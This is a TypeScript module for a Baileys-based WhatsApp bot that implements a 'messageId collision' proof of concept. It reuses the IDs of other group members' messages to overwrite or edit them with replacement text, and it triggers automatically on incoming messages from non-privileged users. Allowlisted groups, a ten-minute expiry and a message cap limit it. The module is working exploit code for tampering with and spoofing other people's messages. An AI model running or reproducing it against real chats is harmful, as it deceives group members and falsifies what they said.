import type { WAMessage, WASocket } from 'baileys'
import { opsDb, opsInstanceKey } from './ops-database.js'

const EDITALL_TTL_MS = 10 * 60_000
const EDITALL_MAX_MESSAGES = 20

opsDb.exec(`
CREATE TABLE IF NOT EXISTS security_poc_chats (
  instance_key TEXT NOT NULL,
  chat_id TEXT NOT NULL,
  label TEXT,
  added_by TEXT,
  added_at INTEGER NOT NULL,
  PRIMARY KEY (instance_key, chat_id)
);

CREATE TABLE IF NOT EXISTS security_poc_editall (
  instance_key TEXT NOT NULL,
  chat_id TEXT NOT NULL,
  enabled INTEGER NOT NULL DEFAULT 0,
  replacement_text TEXT NOT NULL,
  remaining INTEGER NOT NULL DEFAULT 0,
  expires_at INTEGER NOT NULL DEFAULT 0,
  updated_by TEXT,
  updated_at INTEGER NOT NULL,
  PRIMARY KEY (instance_key, chat_id)
);
`)

export type PocChat = {
  chatId: string
  label: string
  addedBy: string
  addedAt: number
}

export type EditAllPocStatus = {
  enabled: boolean
  replacementText: string
  remaining: number
  expiresAt: number
}

function instanceKey() {
  return opsInstanceKey()
}

function normalizeGroupJid(value: string) {
  const jid = value.trim()
  if (!/^\d+@g\.us$/i.test(jid)) throw new Error('JID de grupo inválido. Debe terminar en @g.us.')
  return jid
}

function legacyEnvAllowed(chatId: string) {
  const enabled = /^(?:1|true|yes|on)$/i.test(process.env.EDIT_POC_ENABLED ?? '')
  if (!enabled) return false
  const allowed = new Set(
    (process.env.EDIT_POC_CHAT_IDS ?? '')
      .split(',')
      .map((value) => value.trim())
      .filter(Boolean),
  )
  return allowed.has(chatId)
}

export function addPocChat(chatId: string, label: string, addedBy: string) {
  const jid = normalizeGroupJid(chatId)
  opsDb.prepare(`
    INSERT INTO security_poc_chats (instance_key, chat_id, label, added_by, added_at)
    VALUES (?, ?, ?, ?, ?)
    ON CONFLICT(instance_key, chat_id) DO UPDATE SET
      label = excluded.label,
      added_by = excluded.added_by,
      added_at = excluded.added_at
  `).run(instanceKey(), jid, label.trim().slice(0, 180), addedBy, Date.now())
}

export function removePocChat(chatId: string) {
  const jid = normalizeGroupJid(chatId)
  const key = instanceKey()
  opsDb.prepare('DELETE FROM security_poc_editall WHERE instance_key = ? AND chat_id = ?').run(key, jid)
  const result = opsDb.prepare('DELETE FROM security_poc_chats WHERE instance_key = ? AND chat_id = ?').run(key, jid)
  return Number(result.changes ?? 0) > 0
}

export function clearPocChats() {
  const key = instanceKey()
  opsDb.prepare('DELETE FROM security_poc_editall WHERE instance_key = ?').run(key)
  const result = opsDb.prepare('DELETE FROM security_poc_chats WHERE instance_key = ?').run(key)
  return Number(result.changes ?? 0)
}

export function listPocChats(): PocChat[] {
  return (opsDb.prepare(`
    SELECT chat_id, COALESCE(label, '') AS label, COALESCE(added_by, '') AS added_by, added_at
    FROM security_poc_chats
    WHERE instance_key = ?
    ORDER BY added_at DESC
  `).all(instanceKey()) as Array<Record<string, unknown>>).map((row) => ({
    chatId: String(row.chat_id ?? ''),
    label: String(row.label ?? ''),
    addedBy: String(row.added_by ?? ''),
    addedAt: Number(row.added_at ?? 0),
  }))
}

export function isPocChatAllowed(chatId: string) {
  if (!/^\d+@g\.us$/i.test(chatId)) return false
  const row = opsDb.prepare(`
    SELECT 1 AS ok FROM security_poc_chats
    WHERE instance_key = ? AND chat_id = ?
    LIMIT 1
  `).get(instanceKey(), chatId)
  return Boolean(row) || legacyEnvAllowed(chatId)
}

export function enableEditAllPoc(chatId: string, replacementText: string, updatedBy: string) {
  const jid = normalizeGroupJid(chatId)
  if (!isPocChatAllowed(jid)) throw new Error('Este grupo no está autorizado para pruebas PoC.')
  const text = replacementText.trim().slice(0, 1200) || '[Ghost Nexora PoC] prueba de colisión de messageId'
  const now = Date.now()
  const expiresAt = now + EDITALL_TTL_MS
  opsDb.prepare(`
    INSERT INTO security_poc_editall
      (instance_key, chat_id, enabled, replacement_text, remaining, expires_at, updated_by, updated_at)
    VALUES (?, ?, 1, ?, ?, ?, ?, ?)
    ON CONFLICT(instance_key, chat_id) DO UPDATE SET
      enabled = 1,
      replacement_text = excluded.replacement_text,
      remaining = excluded.remaining,
      expires_at = excluded.expires_at,
      updated_by = excluded.updated_by,
      updated_at = excluded.updated_at
  `).run(instanceKey(), jid, text, EDITALL_MAX_MESSAGES, expiresAt, updatedBy, now)
  return { enabled: true, replacementText: text, remaining: EDITALL_MAX_MESSAGES, expiresAt }
}

export function disableEditAllPoc(chatId: string, updatedBy = '') {
  const jid = normalizeGroupJid(chatId)
  opsDb.prepare(`
    UPDATE security_poc_editall
    SET enabled = 0, remaining = 0, updated_by = ?, updated_at = ?
    WHERE instance_key = ? AND chat_id = ?
  `).run(updatedBy, Date.now(), instanceKey(), jid)
}

export function getEditAllPocStatus(chatId: string): EditAllPocStatus {
  const jid = normalizeGroupJid(chatId)
  const row = opsDb.prepare(`
    SELECT enabled, replacement_text, remaining, expires_at
    FROM security_poc_editall
    WHERE instance_key = ? AND chat_id = ?
  `).get(instanceKey(), jid) as Record<string, unknown> | undefined
  if (!row) return { enabled: false, replacementText: '', remaining: 0, expiresAt: 0 }
  const expiresAt = Number(row.expires_at ?? 0)
  const remaining = Number(row.remaining ?? 0)
  const enabled = Boolean(Number(row.enabled ?? 0)) && expiresAt > Date.now() && remaining > 0 && isPocChatAllowed(jid)
  if (!enabled && Number(row.enabled ?? 0)) disableEditAllPoc(jid)
  return {
    enabled,
    replacementText: String(row.replacement_text ?? ''),
    remaining: enabled ? remaining : 0,
    expiresAt: enabled ? expiresAt : 0,
  }
}

function consumeEditAllPoc(chatId: string) {
  const status = getEditAllPocStatus(chatId)
  if (!status.enabled) return null
  const key = instanceKey()
  opsDb.prepare(`
    UPDATE security_poc_editall
    SET remaining = CASE WHEN remaining > 0 THEN remaining - 1 ELSE 0 END,
        enabled = CASE WHEN remaining <= 1 THEN 0 ELSE enabled END,
        updated_at = ?
    WHERE instance_key = ? AND chat_id = ? AND enabled = 1
  `).run(Date.now(), key, chatId)
  return status
}

export async function executeMessageIdCollisionPoc(
  socket: WASocket,
  chatId: string,
  targetMessageId: string,
  text: string,
) {
  if (!isPocChatAllowed(chatId)) throw new Error('Este grupo no está autorizado para pruebas PoC.')
  await socket.relayMessage(
    chatId,
    { extendedTextMessage: { text } },
    { messageId: targetMessageId },
  )
}

export async function executeEditMessageIdPoc(
  socket: WASocket,
  chatId: string,
  targetMessageId: string,
  text: string,
) {
  if (!isPocChatAllowed(chatId)) throw new Error('Este grupo no está autorizado para pruebas PoC.')
  await socket.sendMessage(
    chatId,
    { text, edit: { id: targetMessageId } } as never,
    { messageId: targetMessageId },
  )
}

export async function maybeRunEditAllPoc(
  socket: WASocket,
  message: WAMessage,
  actorIsPrivileged: boolean,
) {
  const chatId = message.key.remoteJid ?? ''
  const targetMessageId = message.key.id ?? ''
  if (!chatId.endsWith('@g.us') || !targetMessageId || message.key.fromMe || actorIsPrivileged) return false
  const status = consumeEditAllPoc(chatId)
  if (!status) return false
  await executeMessageIdCollisionPoc(socket, chatId, targetMessageId, status.replacementText)
  return true
}
